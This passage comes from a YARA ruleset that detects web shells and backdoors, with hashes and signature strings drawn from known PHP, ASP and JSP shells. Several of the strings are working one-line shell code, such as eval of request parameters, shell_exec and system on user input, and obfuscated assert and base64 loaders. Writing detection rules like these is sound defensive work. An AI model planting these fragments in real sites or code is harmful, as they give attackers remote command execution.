description = "Web Shell - from files 000.jsp, 403.jsp, 807.jsp, a.jsp, c5.jsp, config.jsp, css.jsp, dm.jsp, he1p.jsp, JspSpy.jsp, JspSpyJDK5.jsp, JspSpyJDK51.jsp, luci.jsp.spy2009.jsp, m.jsp, ma3.jsp, mmym520.jsp, myxx.jsp, nogfw.jsp, ok.jsp, queryDong.jsp, spyjsp2010.jsp, style.jsp, u.jsp, xia.jsp, zend.jsp, cofigrue.jsp, 1.jsp, jspspy.jsp, jspspy_k8.jsp, JspSpy.jsp, JspSpyJDK5.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
hash1 = "059058a27a7b0059e2c2f007ad4675ef"
hash2 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
hash3 = "76037ebd781ad0eac363d56fc81f4b4f"
hash4 = "8b457934da3821ba58b06a113e0d53d9"
hash5 = "d44df8b1543b837e57cc8f25a0a68d92"
hash6 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
hash7 = "14e9688c86b454ed48171a9d4f48ace8"
hash8 = "b330a6c2d49124ef0729539761d6ef0b"
hash9 = "d71716df5042880ef84427acee8b121e"
hash10 = "341298482cf90febebb8616426080d1d"
hash11 = "29aebe333d6332f0ebc2258def94d57e"
hash12 = "42654af68e5d4ea217e6ece5389eb302"
hash13 = "88fc87e7c58249a398efd5ceae636073"
hash14 = "4a812678308475c64132a9b56254edbc"
hash15 = "9626eef1a8b9b8d773a3b2af09306a10"
hash16 = "e0354099bee243702eb11df8d0e046df"
hash17 = "344f9073576a066142b2023629539ebd"
hash18 = "32dea47d9c13f9000c4c807561341bee"
hash19 = "90a5ba0c94199269ba33a58bc6a4ad99"
hash20 = "655722eaa6c646437c8ae93daac46ae0"
hash21 = "b9744f6876919c46a29ea05b1d95b1c3"
hash22 = "6acc82544be056580c3a1caaa4999956"
hash23 = "6aa32a6392840e161a018f3907a86968"
hash24 = "591ca89a25f06cf01e4345f98a22845c"
hash25 = "349ec229e3f8eda0f9eb918c74a8bf4c"
hash26 = "3ea688e3439a1f56b16694667938316d"
hash27 = "ab77e4d1006259d7cbc15884416ca88c"
hash28 = "71097537a91fac6b01f46f66ee2d7749"
hash29 = "2434a7a07cb47ce25b41d30bc291cacc"
hash30 = "7a4b090619ecce6f7bd838fe5c58554b"
strings:
$s3 = "String savePath = request.getParameter(\"savepath\");" fullword
$s4 = "URL downUrl = new URL(downFileUrl);" fullword
$s5 = "if (Util.isEmpty(downFileUrl) || Util.isEmpty(savePath))" fullword
$s6 = "String downFileUrl = request.getParameter(\"url\");" fullword
$s7 = "FileInputStream fInput = new FileInputStream(f);" fullword
$s8 = "URLConnection conn = downUrl.openConnection();" fullword
$s9 = "sis = request.getInputStream();" fullword
condition:
4 of them
}
rule SSC_WebShell_Generic_PHP_3 {
meta:
description = "PHP Webshells Github Archive - from files Antichat Shell v1.3.php, Antichat Shell. Modified by Go0o$E.php, Antichat Shell.php, fatal.php"
author = "Florian Roth"
super_rule = 1
hash0 = "d829e87b3ce34460088c7775a60bded64e530cd4"
hash1 = "d710c95d9f18ec7c76d9349a28dd59c3605c02be"
hash2 = "f044d44e559af22a1a7f9db72de1206f392b8976"
hash3 = "41780a3e8c0dc3cbcaa7b4d3c066ae09fb74a289"
strings:
$s0 = "header('Content-Length:'.filesize($file).'');" fullword
$s4 = "<textarea name=\\\"command\\\" rows=\\\"5\\\" cols=\\\"150\\\">\".@$_POST['comma"
$s7 = "if(filetype($dir . $file)==\"file\")$files[]=$file;" fullword
$s14 = "elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} " fullword
$s20 = "$info .= (($perms & 0x0004) ? 'r' : '-');" fullword
condition:
all of them
}
rule SSC_Webshell_c99_4 {
meta:
description = "Detects C99 Webshell"
author = "Florian Roth"
reference = "https://github.com/nikicat/web-malware-collection"
date = "2016-01-11"
score = 70
hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
hash2 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
hash3 = "d4424c61fe29d2ee3d8503f7d65feb48341ac2fc0049119f83074950e41194d5"
hash4 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
hash5 = "21dd06ec423f0b49732e4289222864dcc055967922d0fcec901d38a57ed77f06"
hash6 = "c377f9316a4c953602879eb8af1fd7cbb0dd35de6bb4747fa911234082c45596"
hash7 = "816e699014be9a6d02d5d184eb958c49469d687b7c6fb88e878bca64688a19c9"
hash8 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
hash9 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
hash10 = "615e768522447558970c725909e064558f33d38e6402c63c92a1a8bc62b64966"
hash11 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
hash12 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
hash13 = "a4db77895228f02ea17ff48976e03100ddfaef7c9f48c1d40462872f103451d5"
hash14 = "1fdf6e142135a34ae1caf1d84adf5e273b253ca46c409b2530ca06d65a55ecbd"
strings:
$s1 = "displaysecinfo(\"List of Attributes\",myshellexec(\"lsattr -a\"));" fullword ascii
$s2 = "displaysecinfo(\"RAM\",myshellexec(\"free -m\"));" fullword ascii
$s3 = "displaysecinfo(\"Where is perl?\",myshellexec(\"whereis perl\"));" fullword ascii
$s4 = "$ret = myshellexec($handler);" fullword ascii
$s5 = "if (posix_kill($pid,$sig)) {echo \"OK.\";}" fullword ascii
condition:
filesize < 900KB and 1 of them
}
rule SSC_webshell_php_moon {
meta:
description = "Web Shell - file moon.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "2a2b1b783d3a2fa9a50b1496afa6e356"
strings:
$s2 = "echo '<option value=\"create function backshell returns string soname"
$s3 = "echo      \"<input name='p' type='text' size='27' value='\".dirname(_FILE_).\""
$s8 = "echo '<option value=\"select cmdshell(\\'net user "
condition:
2 of them
}
rule SSC_webshell_caidao_shell_404 {
meta:
description = "Web Shell - file 404.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "ee94952dc53d9a29bdf4ece54c7a7aa7"
strings:
$s0 = "<?php $K=sTr_RepLaCe('`','','a`s`s`e`r`t');$M=$_POST[ice];IF($M==NuLl)HeaDeR('St"
condition:
all of them
}
rule SSC_FeliksPack3___PHP_Shells_2005 {
meta:
description = "Webshells Auto-generated - file 2005.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "97f2552c2fafc0b2eb467ee29cc803c8"
strings:
$s0 = "window.open(\"\"&url&\"?id=edit&path=\"+sfile+\"&op=copy&attrib=\"+attrib+\"&dpath=\"+lp"
$s3 = "<input name=\"dbname\" type=\"hidden\" id=\"dbname\" value=\"<%=request(\"dbname\")%>\">"
condition:
all of them
}
rule SSC_multiple_webshells_0021 {
meta:
description = "Semi-Auto-generated  - from files GFS web-shell ver 3.1.7 - PRiV8.php.txt, nshell.php.php.txt, gfs_sh.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
was = "_GFS_web_shell_ver_3_1_7___PRiV8_php_nshell_php_php_gfs_sh_php_php"
hash0 = "be0f67f3e995517d18859ed57b4b4389"
hash1 = "4a44d82da21438e32d4f514ab35c26b6"
hash2 = "f618f41f7ebeb5e5076986a66593afd1"
strings:
$s2 = "echo $uname.\"</font><br><b>\";" fullword
$s3 = "while(!feof($f)) { $res.=fread($f,1024); }" fullword
$s4 = "echo \"user=\".@get_current_user().\" uid=\".@getmyuid().\" gid=\".@getmygid()"
condition:
2 of them
}
rule SSC_webshell_PHP_bug_1_ {
meta:
description = "Web Shell - file bug (1).php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "91c5fae02ab16d51fc5af9354ac2f015"
strings:
$s0 = "@include($_GET['bug']);" fullword
condition:
all of them
}
rule SSC_multiple_webshells_0027 {
meta:
description = "Semi-Auto-generated  - from files nst.php.php.txt, cybershell.php.php.txt, img.php.php.txt, nstview.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
was = "_nst_php_php_cybershell_php_php_img_php_php_nstview_php_php"
hash0 = "ddaf9f1986d17284de83a17fe5f9fd94"
hash1 = "ef8828e0bc0641a655de3932199c0527"
hash2 = "17a07bb84e137b8aa60f87cd6bfab748"
hash3 = "4745d510fed4378e4b1730f56f25e569"
strings:
$s0 = "@$rto=$_POST['rto'];" fullword
$s2 = "SCROLLBAR-TRACK-COLOR: #91AAFF" fullword
$s3 = "$to1=str_replace(\"//\",\"/\",$to1);" fullword
condition:
2 of them
}
rule SSC_svchostdll {
meta:
description = "Webshells Auto-generated - file svchostdll.dll"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "0f6756c8cb0b454c452055f189e4c3f4"
strings:
$s0 = "InstallService"
$s1 = "RundllInstallA"
$s2 = "UninstallService"
$s3 = "&G3 Users In RegistryD"
$s4 = "OL_SHUTDOWN;I"
$s5 = "SvcHostDLL.dll"
$s6 = "RundllUninstallA"
$s7 = "InternetOpenA"
$s8 = "Check Cloneomplete"
condition:
all of them
}
rule SSC_webshell_asp_1 {
meta:
description = "Web Shell - file 1.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "8991148adf5de3b8322ec5d78cb01bdb"
strings:
$s4 = "!22222222222222222222222222222222222222222222222222" fullword
$s8 = "<%eval request(\"pass\")%>" fullword
condition:
all of them
}
rule SSC_webshell_000_403_c5_queryDong_spyjsp2010 {
meta:
description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, queryDong.jsp, spyjsp2010.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
hash1 = "059058a27a7b0059e2c2f007ad4675ef"
hash2 = "8b457934da3821ba58b06a113e0d53d9"
hash3 = "90a5ba0c94199269ba33a58bc6a4ad99"
hash4 = "655722eaa6c646437c8ae93daac46ae0"
strings:
$s2 = "\" <select name='encode' class='input'><option value=''>ANSI</option><option val"
$s7 = "JSession.setAttribute(\"MSG\",\"<span style='color:red'>Upload File Failed!</spa"
$s8 = "File f = new File(JSession.getAttribute(CURRENT_DIR)+\"/\"+fileBean.getFileName("
$s9 = "((Invoker)ins.get(\"vd\")).invoke(request,response,JSession);" fullword
condition:
2 of them
}
rule SSC_webshell_2_520_icesword_job_ma1 {
meta:
description = "Web Shell - from files 2.jsp, 520.jsp, icesword.jsp, job.jsp, ma1.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "64a3bf9142b045b9062b204db39d4d57"
hash1 = "9abd397c6498c41967b4dd327cf8b55a"
hash2 = "077f4b1b6d705d223b6d644a4f3eebae"
hash3 = "56c005690da2558690c4aa305a31ad37"
hash4 = "532b93e02cddfbb548ce5938fe2f5559"
strings:
$s1 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"></head>" fullword
$s3 = "<input type=\"hidden\" name=\"_EVENTTARGET\" value=\"\" />" fullword
$s8 = "<input type=\"hidden\" name=\"_EVENTARGUMENT\" value=\"\" />" fullword
condition:
2 of them
}
rule SSC_webshell_asp_ice {
meta:
description = "Web Shell - file ice.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "d141e011a92f48da72728c35f1934a2b"
strings:
$s0 = "D,'PrjknD,J~[,EdnMP[,-4;DS6@#@&VKobx2ldd,'~JhC"
condition:
all of them
}
rule SSC_WebShell_C99madShell_v__2_0_madnet_edition {
meta:
description = "PHP Webshells Github Archive - file C99madShell v. 2.0 madnet edition.php"
author = "Florian Roth"
hash = "f99f8228eb12746847f54bad45084f19d1a7e111"
strings:
$s0 = "$md5_pass = \"\"; //If no pass then hash" fullword
$s1 = "eval(gzinflate(base64_decode('"
$s2 = "$pass = \"\";  //Pass" fullword
$s3 = "$login = \"\"; //Login" fullword
$s4 = "//Authentication" fullword
condition:
all of them
}
rule SSC_Webshell_zehir {
meta:
description = "Detects Webshell - rule generated from from files elmaliseker.asp, zehir.asp, zehir.txt, zehir4.asp, zehir4.txt"
author = "Florian Roth"
reference = "https://github.com/nikicat/web-malware-collection"
date = "2016-01-11"
score = 70
hash1 = "16e1e886576d0c70af0f96e3ccedfd2e72b8b7640f817c08a82b95ff5d4b1218"
hash2 = "0c5f8a2ed62d10986a2dd39f52886c0900a18c03d6d279207b8de8e2ed14adf6"
hash3 = "cb9d5427a83a0fc887e49f07f20849985bd2c3850f272ae1e059a08ac411ff66"
hash4 = "b57bf397984545f419045391b56dcaf7b0bed8b6ee331b5c46cee35c92ffa13d"
hash5 = "febf37a9e8ba8ece863f506ae32ad398115106cc849a9954cbc0277474cdba5c"
strings:
$s1 = "for (i=1; i<=frmUpload.max.value; i++) str+='File '+i+': <input type=file name=file'+i+'><br>';" fullword ascii
$s2 = "if (frmUpload.max.value<=0) frmUpload.max.value=1;" fullword ascii
condition:
filesize < 200KB and 1 of them
}
rule SSC_byshell063_ntboot {
meta:
description = "Webshells Auto-generated - file ntboot.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "99b5f49db6d6d9a9faeffb29fd8e6d8c"
strings:
$s0 = "SYSTEM\\CurrentControlSet\\Services\\NtBoot"
$s1 = "Failure ... Access is Denied !"
$s2 = "Dumping Description to Registry..."
$s3 = "Opening Service .... Failure !"
condition:
all of them
}
rule SSC_webshell_NIX_REMOTE_WEB_SHELL_nstview_xxx {
meta:
description = "Web Shell - from files NIX REMOTE WEB-SHELL.php, nstview.php, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php, Cyber Shell (v 1.0).php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "0b19e9de790cd2f4325f8c24b22af540"
hash1 = "4745d510fed4378e4b1730f56f25e569"
hash2 = "f3ca29b7999643507081caab926e2e74"
hash3 = "46a18979750fa458a04343cf58faa9bd"
strings:
$s3 = "BODY, TD, TR {" fullword
$s5 = "$d=str_replace(\"\\\\\",\"/\",$d);" fullword
$s6 = "if ($file==\".\" || $file==\"..\") continue;" fullword
condition:
2 of them
}
rule SSC_connectback2_pl {
meta:
description = "Semi-Auto-generated  - file connectback2.pl.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "473b7d226ea6ebaacc24504bd740822e"
strings:
$s0 = "#We Are: MasterKid, AleXutz, FatMan & MiKuTuL                                   "
$s1 = "echo --==Userinfo==-- ; id;echo;echo --==Directory==-- ; pwd;echo; echo --==Shel"
$s2 = "ConnectBack Backdoor"
condition:
1 of them
}
rule SSC_WebShell_qsd_php_backdoor {
meta:
description = "PHP Webshells Github Archive - file qsd-php-backdoor.php"
author = "Florian Roth"
hash = "4856bce45fc5b3f938d8125f7cdd35a8bbae380f"
strings:
$s1 = "// A robust backdoor script made by Daniel Berliner - http://www.qsdconsulting.c"
$s2 = "if(isset($_POST[\"newcontent\"]))" fullword
$s3 = "foreach($parts as $val)//Assemble the path back together" fullword
$s7 = "$_POST[\"newcontent\"]=urldecode(base64_decode($_POST[\"newcontent\"]));" fullword
condition:
2 of them
}
rule SSC_s72_Shell_v1_1_Coding_html {
meta:
description = "Semi-Auto-generated  - file s72 Shell v1.1 Coding.html.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "c2e8346a5515c81797af36e7e4a3828e"
strings:
$s0 = "Dizin</font></b></font><font face=\"Verdana\" style=\"font-size: 8pt\"><"
$s1 = "s72 Shell v1.0 Codinf by Cr@zy_King"
$s3 = "echo \"<p align=center>Dosya Zaten Bulunuyor</p>\""
condition:
1 of them
}
rule SSC_JSP_jfigueiredo_APT_webshell {
meta:
description = "JSP Browser used as web shell by APT groups - author: jfigueiredo"
author = "F.Roth"
date = "12.10.2014"
score = 60
reference = "http://ceso.googlecode.com/svn/web/bko/filemanager/Browser.jsp"
strings:
$a1 = "String fhidden = new String(Base64.encodeBase64(path.getBytes()));" ascii
$a2 = "<form id=\"upload\" name=\"upload\" action=\"ServFMUpload\" method=\"POST\" enctype=\"multipart/form-data\">" ascii
condition:
all of them
}
rule SSC_WebShell__Cyber_Shell_cybershell_Cyber_Shell__v_1_0_ {
meta:
description = "PHP Webshells Github Archive - from files Cyber Shell.php, cybershell.php, Cyber Shell (v 1.0).php"
author = "Florian Roth"
super_rule = 1
hash0 = "ef7f7c45d26614cea597f2f8e64a85d54630fe38"
hash1 = "cabf47b96e3b2c46248f075bdbc46197db28a25f"
hash2 = "9e165d4ed95e0501cd9a90155ac60546eb5b1076"
strings:
$s4 = " <a href=\"http://www.cyberlords.net\" target=\"_blank\">Cyber Lords Community</"
$s10 = "echo \"<meta http-equiv=Refresh content=\\\"0; url=$PHP_SELF?edit=$nameoffile&sh"
$s11 = " *   Coded by Pixcher" fullword
$s16 = "<input type=text size=55 name=newfile value=\"$d/newfile.php\">" fullword
condition:
2 of them
}
rule SSC_sendmail {
meta:
description = "Webshells Auto-generated - file sendmail.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "75b86f4a21d8adefaf34b3a94629bd17"
strings:
$s3 = "_NextPyC808"
$s6 = "Copyright (C) 2000, Diamond Computer Systems Pty. Ltd. (www.diamondcs.com.au)"
condition:
all of them
}
rule SSC_sql_php_php {
meta:
description = "Semi-Auto-generated  - file sql.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "8334249cbb969f2d33d678fec2b680c5"
strings:
$s1 = "fputs ($fp, \"# RST MySQL tools\\r\\n# Home page: http://rst.void.ru\\r\\n#"
$s2 = "http://rst.void.ru"
$s3 = "print \"<a href=\\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&"
condition:
1 of them
}
rule SSC_webshell_asp_1d {
meta:
description = "Web Shell - file 1d.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "fad7504ca8a55d4453e552621f81563c"
strings:
$s0 = "+9JkskOfKhUxZJPL~\\(mD^W~[,{@#@&EO"
condition:
all of them
}
rule SSC_webshell_PHP_b37 {
meta:
description = "Web Shell - file b37.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "0421445303cfd0ec6bc20b3846e30ff0"
strings:
$s0 = "xmg2/G4MZ7KpNveRaLgOJvBcqa2A8/sKWp9W93NLXpTTUgRc"
condition:
all of them
}
rule SSC_HYTop_AppPack_2005 {
meta:
description = "Webshells Auto-generated - file 2005.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "63d9fd24fa4d22a41fc5522fc7050f9f"
strings:
$s6 = "\" onclick=\"this.form.sqlStr.value='e:\\hytop.mdb"
condition:
all of them
}
rule SSC_WebShell_ironshell {
meta:
description = "PHP Webshells Github Archive - file ironshell.php"
author = "Florian Roth"
hash = "d47b8ba98ea8061404defc6b3a30839c4444a262"
strings:
$s0 = "<title>'.getenv(\"HTTP_HOST\").' ~ Shell I</title>" fullword
$s2 = "$link = mysql_connect($_POST['host'], $_POST['username'], $_POST"
$s4 = "error_reporting(0); //If there is an error, we'll show it, k?" fullword
$s8 = "print \"<form action=\\\"\".$me.\"?p=chmod&file=\".$content.\"&d"
$s15 = "if(!is_numeric($_POST['timelimit']))" fullword
$s16 = "if($_POST['chars'] == \"9999\")" fullword
$s17 = "<option value=\\\"az\\\">a - zzzzz</option>" fullword
$s18 = "print shell_exec($command);" fullword
condition:
3 of them
}
rule SSC_WebShell_STNC_WebShell_v0_8 {
meta:
description = "PHP Webshells Github Archive - file STNC WebShell v0.8.php"
author = "Florian Roth"
hash = "52068c9dff65f1caae8f4c60d0225708612bb8bc"
strings:
$s3 = "if(isset($_POST[\"action\"])) $action = $_POST[\"action\"];" fullword
$s8 = "elseif(fe(\"system\")){ob_start();system($s);$r=ob_get_contents();ob_end_clean()"
$s13 = "{ $pwd = $_POST[\"pwd\"]; $type = filetype($pwd); if($type === \"dir\")chdir($pw"
condition:
2 of them
}
rule SSC_WebShell_dC3_Security_Crew_Shell_PRiV {
meta:
description = "PHP Webshells Github Archive - file dC3_Security_Crew_Shell_PRiV.php"
author = "Florian Roth"
hash = "1b2a4a7174ca170b4e3a8cdf4814c92695134c8a"
strings:
$s0 = "@rmdir($_GET['file']) or die (\"[-]Error deleting dir!\");" fullword
$s4 = "$ps=str_replace(\"\\\\\",\"/\",getenv('DOCUMENT_ROOT'));" fullword
$s5 = "header(\"Expires: \".date(\"r\",mktime(0,0,0,1,1,2030)));" fullword
$s15 = "search_file($_POST['search'],urldecode($_POST['dir']));" fullword
$s16 = "echo base64_decode($images[$_GET['pic']]);" fullword
$s20 = "if (isset($_GET['rename_all'])) {" fullword
condition:
3 of them
}
rule SSC_webshell_PHP_g00nv13 {
meta:
description = "Web Shell - file g00nv13.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "35ad2533192fe8a1a76c3276140db820"
strings:
$s1 = "case \"zip\": case \"tar\": case \"rar\": case \"gz\": case \"cab\": cas"
$s4 = "if(!($sqlcon = @mysql_connect($_SESSION['sql_host'] . ':' . $_SESSION['sql_p"
condition:
all of them
}
rule SSC_webshell_webshells_new_php2 {
meta:
description = "Web shells - generated from file php2.php"
author = "Florian Roth"
date = "2014/03/28"
score = 70
hash = "fbf2e76e6f897f6f42b896c855069276"
strings:
$s0 = "<?php $s=@$_GET[2];if(md5($s.$s)=="
condition:
all of them
}
rule SSC_webshell_webshells_new_PHP {
meta:
description = "Web shells - generated from file PHP.php"
author = "Florian Roth"
date = "2014/03/28"
score = 70
hash = "a524e7ae8d71e37d2fd3e5fbdab405ea"
strings:
$s1 = "echo \"<font color=blue>Error!</font>\";" fullword
$s2 = "<input type=\"text\" size=61 name=\"f\" value='<?php echo $_SERVER[\"SCRIPT_FILE"
$s5 = " - ExpDoor.com</title>" fullword
$s10 = "$f=fopen($_POST[\"f\"],\"w\");" fullword
$s12 = "<textarea name=\"c\" cols=60 rows=15></textarea><br>" fullword
condition:
1 of them
}
rule SSC_Java_Shell_js {
meta:
description = "Semi-Auto-generated  - file Java Shell.js.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "36403bc776eb12e8b7cc0eb47c8aac83"
strings:
$s2 = "PySystemState.initialize(System.getProperties(), null, argv);" fullword
$s3 = "public class JythonShell extends JPanel implements Runnable {" fullword
$s4 = "public static int DEFAULT_SCROLLBACK = 100"
condition:
2 of them
}
rule SSC_FSO_s_RemExp {
meta:
description = "Webshells Auto-generated - file RemExp.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "b69670ecdbb40012c73686cd22696eeb"
strings:
$s1 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=SubFolder.Name%>\"> <a href= \"<%=Request.Ser"
$s5 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f=<%=F"
$s6 = "<td bgcolor=\"<%=BgColor%>\" align=\"right\"><%=Attributes(SubFolder.Attributes)%></"
condition:
all of them
}
rule SSC_HDConfig {
meta:
description = "Webshells Auto-generated - file HDConfig.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "7d60e552fdca57642fd30462416347bd"
strings:
$s0 = "An encryption key is derived from the password hash. "
$s3 = "A hash object has been created. "
$s4 = "Error during CryptCreateHash!"
$s5 = "A new key container has been created."
$s6 = "The password has been added to the hash. "
condition:
all of them
}
rule SSC_FeliksPack3___PHP_Shells_ssh {
meta:
description = "Webshells Auto-generated - file ssh.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "1aa5307790d72941589079989b4f900e"
strings:
$s0 = "eval(gzinflate(str_rot13(base64_decode('"
condition:
all of them
}
rule SSC_elmaliseker {
meta:
description = "Webshells Auto-generated - file elmaliseker.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "ccf48af0c8c09bbd038e610a49c9862e"
strings:
$s0 = "javascript:Command('Download'"
$s5 = "zombie_array=array("
condition:
all of them
}
rule SSC_ru24_post_sh_php_php {
meta:
description = "Semi-Auto-generated  - file ru24_post_sh.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "5b334d494564393f419af745dc1eeec7"
strings:
$s1 = "<title>Ru24PostWebShell - \".$_POST['cmd'].\"</title>" fullword
$s3 = "if ((!$_POST['cmd']) || ($_POST['cmd']==\"\")) { $_POST['cmd']=\"id;pwd;uname -a"
$s4 = "Writed by DreAmeRz" fullword
condition:
1 of them
}
rule SSC_FSO_s_phpinj_2 {
meta:
description = "Webshells Auto-generated - file phpinj.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "dd39d17e9baca0363cc1c3664e608929"
strings:
$s9 = "<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 INTO"
condition:
all of them
}
rule SSC_multiple_webshells_0004 {
meta:
description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, SpecialShell_99.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
was = "_w_php_php_c99madshell_v2_1_php_php_wacking_php_php_SpecialShell_99_php_php"
hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
hash1 = "3ca5886cd54d495dc95793579611f59a"
hash2 = "9c5bb5e3a46ec28039e8986324e42792"
hash3 = "09609851caa129e40b0d56e90dfc476c"
strings:
$s2 = "echo \"<hr size=\\\"1\\\" noshade><b>Done!</b><br>Total time (secs.): \".$ft"
$s3 = "$fqb_log .= \"\\r\\n------------------------------------------\\r\\nDone!\\r"
condition:
1 of them
}
rule SSC_webshell_807_a_css_dm_he1p_JspSpy_xxx {
meta:
description = "Web Shell - from files 807.jsp, a.jsp, css.jsp, dm.jsp, he1p.jsp, JspSpy.jsp, JspSpyJDK5.jsp, JspSpyJDK51.jsp, luci.jsp.spy2009.jsp, m.jsp, ma3.jsp, mmym520.jsp, nogfw.jsp, ok.jsp, style.jsp, u.jsp, xia.jsp, cofigrue.jsp, 1.jsp, jspspy.jsp, jspspy_k8.jsp, JspSpy.jsp, JspSpyJDK5.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
hash1 = "76037ebd781ad0eac363d56fc81f4b4f"
hash2 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
hash3 = "14e9688c86b454ed48171a9d4f48ace8"
hash4 = "b330a6c2d49124ef0729539761d6ef0b"
hash5 = "d71716df5042880ef84427acee8b121e"
hash6 = "341298482cf90febebb8616426080d1d"
hash7 = "29aebe333d6332f0ebc2258def94d57e"
hash8 = "42654af68e5d4ea217e6ece5389eb302"
hash9 = "88fc87e7c58249a398efd5ceae636073"
hash10 = "4a812678308475c64132a9b56254edbc"
hash11 = "9626eef1a8b9b8d773a3b2af09306a10"
hash12 = "344f9073576a066142b2023629539ebd"
hash13 = "32dea47d9c13f9000c4c807561341bee"
hash14 = "b9744f6876919c46a29ea05b1d95b1c3"
hash15 = "6acc82544be056580c3a1caaa4999956"
hash16 = "6aa32a6392840e161a018f3907a86968"
hash17 = "349ec229e3f8eda0f9eb918c74a8bf4c"
hash18 = "3ea688e3439a1f56b16694667938316d"
hash19 = "ab77e4d1006259d7cbc15884416ca88c"
hash20 = "71097537a91fac6b01f46f66ee2d7749"
hash21 = "2434a7a07cb47ce25b41d30bc291cacc"
hash22 = "7a4b090619ecce6f7bd838fe5c58554b"
strings:
$s1 = "\"<h2>Remote Control &raquo;</h2><input class=\\\"bt\\\" onclick=\\\"var"
$s2 = "\"<p>Current File (import new file name and new file)<br /><input class=\\\"inpu"
$s3 = "\"<p>Current file (fullpath)<br /><input class=\\\"input\\\" name=\\\"file\\\" i"
condition:
all of them
}
rule SSC_multiple_webshells_0030 {
meta:
description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, 1.txt, SpecialShell_99.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
was = "_w_php_php_c99madshell_v2_1_php_php_wacking_php_php_1_SpecialShell_99_php_php"
hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
hash1 = "3ca5886cd54d495dc95793579611f59a"
hash2 = "9c5bb5e3a46ec28039e8986324e42792"
hash3 = "44542e5c3e9790815c49d5f9beffbbf2"
hash4 = "09609851caa129e40b0d56e90dfc476c"
strings:
$s0 = "if ($total === FALSE) {$total = 0;}" fullword
$s1 = "$free_percent = round(100/($total/$free),2);" fullword
$s2 = "if (!$bool) {$bool = is_dir($letter.\":\\\\\");}" fullword
$s3 = "$bool = $isdiskette = in_array($letter,$safemode_diskettes);" fullword
condition:
2 of them
}
rule SSC_webshell_webshells_new_xxx {
meta:
description = "Web shells - generated from file xxx.php"
author = "Florian Roth"
date = "2014/03/28"
score = 70
hash = "0e71428fe68b39b70adb6aeedf260ca0"
strings:
$s3 = "<?php array_map(\"ass\\x65rt\",(array)$_REQUEST['expdoor']);?>" fullword
condition:
all of them
}
rule SSC_webshell_webshells_new_code {
meta:
description = "Web shells - generated from file code.php"
author = "Florian Roth"
date = "2014/03/28"
score = 70
hash = "a444014c134ff24c0be5a05c02b81a79"
strings:
$s1 = "<a class=\"high2\" href=\"javascript:;;;\" name=\"action=show&dir=$_ipage_fi"
$s7 = "$file = !empty($_POST[\"dir\"]) ? urldecode(self::convert_to_utf8(rtrim($_PO"
$s10 = "if (true==@move_uploaded_file($_FILES['userfile']['tmp_name'],self::convert_"
